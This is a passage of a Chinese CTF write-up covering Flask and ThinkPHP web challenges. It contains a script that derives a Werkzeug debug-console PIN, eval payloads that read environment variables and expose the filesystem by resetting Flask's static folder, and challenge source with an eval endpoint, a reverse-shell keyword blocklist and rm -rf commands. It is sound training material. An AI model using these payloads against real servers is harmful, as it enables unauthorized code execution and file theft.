设置为空让他报错，拿路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/usr/lib/python3<span class="hljs-number">.9</span>/site-packages/flask/app.py/<br></code></pre></td></tr></table></figure><p><code>/proc/sys/kernel/random/boot_id</code> 和 <code>/proc/1/cpuset</code> 拼接</p><p>网上拿个 3.8 以上的脚本运行即可得 <code>Pin</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<span class="hljs-string">&quot;ctfUser&quot;</span>, <span class="hljs-string">&quot;flask.app&quot;</span>, <span class="hljs-string">&quot;Flask&quot;</span>, <span class="hljs-string">&quot;/usr/lib/python3.9/site-packages/flask/app.py&quot;</span>]<br><br>private_bits = [<span class="hljs-string">&quot;77242943286536&quot;</span>, <span class="hljs-string">&quot;d8c226fb-ceb1-4366-ad71-e8e995dc3065295994fbbc16ccd78255e09a07cfcbc3c1829cf4f812bccbaf1030372756b4db&quot;</span>]  <span class="hljs-comment"># get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id</span><br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>cookie_name = <span class="hljs-string">f&quot;__wzd<span class="hljs-subst">&#123;h.hexdigest()[:<span class="hljs-number">20</span>]&#125;</span>&quot;</span><br><br><span class="hljs-comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br><span class="hljs-comment"># end up with the same value and generate out 9 digits</span><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br>    num = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d&#125;</span>&quot;</span>[:<span class="hljs-number">9</span>]<br><br><span class="hljs-comment"># Format the pincode in groups of digits for easier remembering if</span><br><span class="hljs-comment"># we don&#x27;t have a result yet.</span><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&quot;-&quot;</span>.join(num[x : x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>拿到 <code>Pin</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">os.popen(&quot;cat /proc/self/environ | grep &#x27;CTF&#x27;&quot;).read()<br></code></pre></td></tr></table></figure><p>读取环境即可</p><h1 id="Web-ezFlask-非预期"><a href="#Web-ezFlask-非预期" class="headerlink" title="[Web]ezFlask(非预期)"></a>[Web]ezFlask(非预期)</h1><p>第一眼感觉是软连接，但是没有目录权限</p><blockquote><p>参考<a target="_blank" rel="noopener" href="https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">CTF中Python_Flask应用的一些解题方法总结 | Savant’s Blog (lxscloud.top)</a>中的<strong>DASCTF-2023-7月赛-ezflask</strong></p></blockquote><p>尝试修改 <code>&quot;_static_folder&quot;:&quot;/&quot;</code></p><p>一顿操作得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;cls&quot;</span>, (), &#123;<span class="hljs-string">&quot;__init__&quot;</span>: <span class="hljs-keyword">lambda</span> self: <span class="hljs-literal">None</span>&#125;).__init__.__globals__[<span class="hljs-string">&quot;app&quot;</span>].__setattr__(<span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br></code></pre></td></tr></table></figure><p>尝试访问 <code>/static/etc/passwd</code> 成功</p><p>这里因为非预期的原因，<code>flag</code>还没生成，所以再随便填个命令使其生成即可，比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&quot;1+1&quot;<br></code></pre></td></tr></table></figure><p>读取 <code>/static/flag</code> 即可</p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort, render_template_string , config<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> re<br><br><br><br>app = Flask(__name__)<br><span class="hljs-comment"># 路由可用性标志</span><br>routes_enabled = &#123;<br>    <span class="hljs-string">&#x27;Adventure&#x27;</span>: <span class="hljs-literal">True</span><br>&#125;<br><br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;sh /start.sh&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;chmod -R 000 /app/static/&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /bin/mkdir&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /bin/touch&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /bin/cp&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /bin/mv&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /bin/curl&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /bin/ping&quot;).read()&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /bin/wget&quot;).read()&#x27;</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span> <span class="hljs-keyword">in</span> os.environ:<br>    <span class="hljs-keyword">del</span> os.environ[<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;冒险即将开始！！！\n&#x27;</span><br>            <span class="hljs-string">&#x27;请移步/Adventure路由进行命令执行，后端语句为：\n&#x27;</span><br>            <span class="hljs-string">&#x27;    cmd = request.form[\&#x27;cmd\&#x27;]\n&#x27;</span><br>            <span class="hljs-string">&#x27;    eval(cmd)\n&#x27;</span><br>            <span class="hljs-string">&#x27;注意，你仅有一次机会，在进行唯一一次成功的命令执行后生成flag并写入/flag\n&#x27;</span><br>            <span class="hljs-string">&#x27;执行无回显，目录没权限部分命令ban，也不要想着写文件~\n&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Adventure&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rce</span>():<br>    <span class="hljs-keyword">if</span> routes_enabled.get(<span class="hljs-string">&#x27;Adventure&#x27;</span>, <span class="hljs-literal">False</span>):<br>        <span class="hljs-comment"># 获取POST请求中的cmd参数</span><br>        cmd = request.form[<span class="hljs-string">&#x27;cmd&#x27;</span>]<br><br><br>        <span class="hljs-keyword">try</span>:<br>            bash_pattern = <span class="hljs-string">r&#x27;(bash|[-]c|[-]i|[-]d|dev|tcp|http|https|base|echo|YmFzaCA|bas|ash|ba\&quot;\&quot;sh|ba\&#x27;\&#x27;sh|ba\&#x27;sh|ba\&quot;sh)&#x27;</span><br><br>            <span class="hljs-comment"># 检查是否反弹shell</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">bool</span>(re.search(bash_pattern, cmd)):<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;亲亲这边不支持反弹shell哦~&quot;</span>, <span class="hljs-number">200</span><br><br>            <span class="hljs-built_in">eval</span>(cmd)<br><br>            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /app/static/&quot;).read()&#x27;</span>)<br><br>            <span class="hljs-comment"># 编码后正则</span><br>            pattern = [<br>                <span class="hljs-string">r&#x27;@app\.route&#x27;</span>,<br>                <span class="hljs-string">r&#x27;ZnJvbSBmbGFzay&#x27;</span>,<br>                <span class="hljs-string">r&#x27;%40app.route&#x27;</span>,<br>                <span class="hljs-string">r&#x27;\x40\x61\x70\x70\x2e\x72\x6f\x75\x74\x65&#x27;</span>,<br>                <span class="hljs-string">r&#x27;@ncc\.ebhgr&#x27;</span>,<br>                <span class="hljs-string">r&#x27;etuor\.ppa@&#x27;</span>,<br>                <span class="hljs-string">r&#x27;\u0040\u0061\u0070\u0070\u002e\u0072\u006f\u0075\u0074\u0065&#x27;</span>,<br>                <span class="hljs-string">r&#x27;from flask import Flask&#x27;</span>,<br>                <span class="hljs-string">r&#x27;from%20flask%20import%20Flask&#x27;</span>,<br>                <span class="hljs-string">r&#x27;\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x6c\x61\x73\x6b&#x27;</span>,<br>                <span class="hljs-string">r&#x27;\u0066\u0072\u006f\u006d\u0020\u0066\u006c\u0061\u0073\u006b\u0020\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u0046\u006c\u0061\u0073\u006b&#x27;</span>,<br>                <span class="hljs-string">r&#x27;sebz synfx vzcbeg Synfx&#x27;</span>,<br>                <span class="hljs-string">r&#x27;&amp;#102;&amp;#114;&amp;#111;&amp;#109;&amp;#32;&amp;#102;&amp;#108;&amp;#97;&amp;#115;&amp;#107;&amp;#32;&amp;#105;&amp;#109;&amp;#112;&amp;#111;&amp;#114;&amp;#116;&amp;#32;&amp;#70;&amp;#108;&amp;#97;&amp;#115;&amp;#107;&#x27;</span>,<br>                <span class="hljs-string">r&#x27;ksalF tropmi ksalf morf&#x27;</span>,<br>                <span class="hljs-string">r&#x27;flag&#x27;</span>,<br>                <span class="hljs-string">r&#x27;galf&#x27;</span>,<br>            ]<br><br>            pattern = <span class="hljs-string">&#x27;|&#x27;</span>.join(pattern)  <span class="hljs-comment"># 将列表合并为一个正则表达式字符串</span><br><br><br>            <span class="hljs-comment"># 检查是否匹配</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">bool</span>(re.search(pattern, <span class="hljs-built_in">eval</span>(cmd))):<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;不要想着读取源码哦~&quot;</span>, <span class="hljs-number">200</span><br><br><br>            <span class="hljs-comment"># 关闭路由</span><br>            routes_enabled[<span class="hljs-string">&#x27;Adventure&#x27;</span>] = <span class="hljs-keyword">not</span> routes_enabled[<span class="hljs-string">&#x27;Adventure&#x27;</span>]<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/jaygalf&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> source_file:<br>                content = source_file.read()<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> target_file:<br>                target_file.write(content)<br><br>            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;rm -rf /app/static/&quot;).read()&#x27;</span>)<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Success! 但是不回显嘻嘻&quot;</span>, <span class="hljs-number">200</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;View function mapping is overwriting an existing endpoint function: (\w+)&quot;</span>, <span class="hljs-built_in">str</span>(e)):<br>                routes_enabled[<span class="hljs-string">&#x27;Adventure&#x27;</span>] = <span class="hljs-keyword">not</span> routes_enabled[<span class="hljs-string">&#x27;Adventure&#x27;</span>]<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/jaygalf&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> source_file:<br>                    content = source_file.read()<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> target_file:<br>                    target_file.write(content)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;恭喜师傅，是预期解！！！！&quot;</span>, <span class="hljs-number">200</span><br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error executing command: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">403</span>)  <span class="hljs-comment"># 如果路由被禁用，则返回403禁止访问</span><br><br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>,host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">9035</span>)<br></code></pre></td></tr></table></figure><h1 id="Web-ez-tp"><a href="#Web-ez-tp" class="headerlink" title="[Web]ez_tp"></a>[Web]ez_tp</h1><p><del>不好评价</del></p><p>关键源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Home</span>\<span class="hljs-title class_">Controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-comment">//$this-&gt;show(&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&#x27;,&#x27;utf-8&#x27;);</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;装起来了&#x27;</span>;    <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h_n</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123;<br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) <span class="hljs-variable">$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>))))) ] = <span class="hljs-variable">$value</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>            <span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>;<br>            <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>();<br>            <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>            <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br>            <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];<br>            <span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>            <span class="hljs-comment">//rewirte shell which uploaded by others, you can do more</span><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$files</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;virink&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$header</span>[<span class="hljs-string">&#x27;Accept&#x27;</span>]); <span class="hljs-comment">//fix a bug</span><br>            <span class="hljs-variable">$input</span> = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;Get&quot;</span> =&gt; <span class="hljs-variable">$get</span>,<br>                <span class="hljs-string">&quot;Post&quot;</span> =&gt; <span class="hljs-variable">$post</span>,<br>                <span class="hljs-string">&quot;Cookie&quot;</span> =&gt; <span class="hljs-variable">$cookie</span>,<br>                <span class="hljs-string">&quot;File&quot;</span> =&gt; <span class="hljs-variable">$files</span>,<br>                <span class="hljs-string">&quot;Header&quot;</span> =&gt; <span class="hljs-variable">$header</span><br>            );<br>            <span class="hljs-comment">//deal with</span><br>            <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|update|delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;<br>            <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;<br>            <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;<br>            <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;<br>            <span class="hljs-variable">$vpattern</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$pattern</span>);<br>            <span class="hljs-variable">$bool</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$vpattern</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$kk</span> =&gt; <span class="hljs-variable">$vv</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$value</span>/i&quot;</span>, <span class="hljs-variable">$vv</span>)) &#123;<br>                            <span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$bool</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">I</span>(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = <span class="hljs-title function_ invoke__">M</span>(<span class="hljs-string">&quot;user&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">waf</span>())&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$ret</span> = <span class="hljs-variable">$User</span>-&gt;<span class="hljs-title function_ invoke__">field</span>(<span 